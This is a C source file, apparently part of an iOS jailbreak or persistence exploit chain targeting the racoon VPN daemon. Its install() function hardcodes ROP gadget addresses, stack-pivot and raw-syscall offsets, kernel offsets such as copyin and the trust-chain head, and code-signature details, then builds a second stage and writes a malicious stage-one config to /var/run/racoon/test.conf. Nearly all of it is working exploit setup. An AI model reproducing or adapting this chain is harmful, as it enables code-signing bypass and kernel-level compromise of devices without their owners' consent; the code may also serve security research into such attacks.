#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include "common.h"
#include "stage1.h"
#include "stage2.h"

int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
{
	offset_struct_t myoffsets;
	// for the symbol finder we need a string xref finder and some instruction decoding mechanism
	// we need to have some xref finder for code
	// For instruction decoding we need the b.gt instruction as well as the adr instruction and cbnz,cbz,blr and ldr

	// find the address of "No more than %d WINS" and "failed to set my ident %s" then an xref to the error handling code and then an xref which calls that code, for the first one you need to find an adr and for the second one you need an ldr
	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0); 
	myoffsets.lcconf_counter_offset = 0x10c; // we could try and find that dynamically or we could just hardcode it cause it prob doesn't change on 11.x (TODO: get that dynamically)
	myoffsets.memmove = 0x1ab3b0d20; // strlcpy second branch
	myoffsets.longjmp = 0x180b126e8; // dlsym
	myoffsets.stack_pivot = 0x180b12714; // longjmp from mov x2, sp
	myoffsets.mmap = 0x18097cbf4; // dlsym of __mmap
	myoffsets.memcpy = 0x18095d634; // dlsym
	myoffsets.open = 0x18097b950; // dlsym
	myoffsets.max_slide = 0x4c74000; // just get 8 bytes at offset 30 from the cache
	myoffsets.slide_value = 0x4000; // hardcode that one
	myoffsets.pivot_x21 = 0x199bb31a8; // I hope this doesn't change on any version but we need to find the same gadget on all version (gadget and byte seqeunce can be found in stage1.m)
	myoffsets.pivot_x21_x9_offset = 0x50-0x38; // this is not needed on 11.1.2 but because 11.3.1 and above lack the orignal x21 gadget we need to introduce that one here
	myoffsets.str_buff_offset = 8; // based on the pivot gadget above
	myoffsets.BEAST_GADGET = 0x1a1664494; // we can find that because it's part of a function and shouldn't change but it's basically also just byte matching cause if it would change the load order the whole framework would stop loading
	myoffsets.BEAST_GADGET_LOADER = 0x1a16644b8; // take the address above and search for the blr x27 and add 4
	myoffsets.BEAST_GADGET_CALL_ONLY = 0x1a16644b4; // take the address above and search for the blr x27
	myoffsets.str_x0_gadget = 0x199875020; // search for the byte sequence again (gadget in rop.h)
	myoffsets.str_x0_gadget_offset = 0x28; // based on the gadget above
	myoffsets.cbz_x0_gadget = 0x19987f230; // search for the byte sequence (gadget in rop.h)
	myoffsets.cbz_x0_x16_load = 0x1b214cc50; // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
	myoffsets.add_x0_gadget = 0x18518bb90; // raw byte search again (gadget is in rop.h)
	myoffsets.fcntl_raw_syscall = 0x18097c434; // raw bytes again (because it's a mov x16, <imm>, svc and that can't change)
	myoffsets.raw_mach_vm_remap_call = 0x180969bb8;
	myoffsets.rop_nop = 0x180b12728; // just use the longjmp gadget above and search the ret instruction
	myoffsets.new_cache_addr = 0x1c0000000; 
	myoffsets.cache_text_seg_size = 0x30000000; // we can get that by parsing the segements from the cache
	myoffsets.errno_offset = 0x1f2d65000; // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
	myoffsets.mach_msg_offset = 0x1f1535018;
	myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
	myoffsets.stage2_max_size = 0x200000;
	myoffsets.thread_max_size = 0x10000;
	myoffsets.ipr_size = 8;
	myoffsets.rootdomainUC_vtab = 0xfffffff00708e158; // iometa
	myoffsets.itk_registered = 0x2f0;
	myoffsets.is_task = 0x28;
	myoffsets.copyin = 0xfffffff0071aa804; // nm
	myoffsets.gadget_add_x0_x0_ret = 0xfffffff0073ce75c; // nm (there's a csblob func doing that)
	myoffsets.swapprefix_addr = 0xfffffff0075b18cc; // search for the string "/private/var/vm/swapfile" in the kernel that's the right address
	myoffsets.trust_chain_head_ptr = 0xfffffff0076b8ee8; // idk but I think the patchfinder can do that
	myoffsets.stage3_fileoffset = 0;
	myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000;
	myoffsets.stage3_size = 0x10000; // get the file size and round at page boundry
	myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + 0x6544; // nm of the function we want to jump to
	myoffsets.stage3_CS_blob = 49744; // jtool --sig shows that info and I think we can get it when parsing the header
	myoffsets.stage3_CS_blob_size = 624; // same for this one

	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
	stage2(&myoffsets,"/private/etc/racoon/");

	// TODO: make sure that the directory exists
	int f = open("/var/run/racoon/test.conf",O_WRONLY | O_CREAT,0644);
	stage1(f,&myoffsets);
	close(f);

	return 0;
}
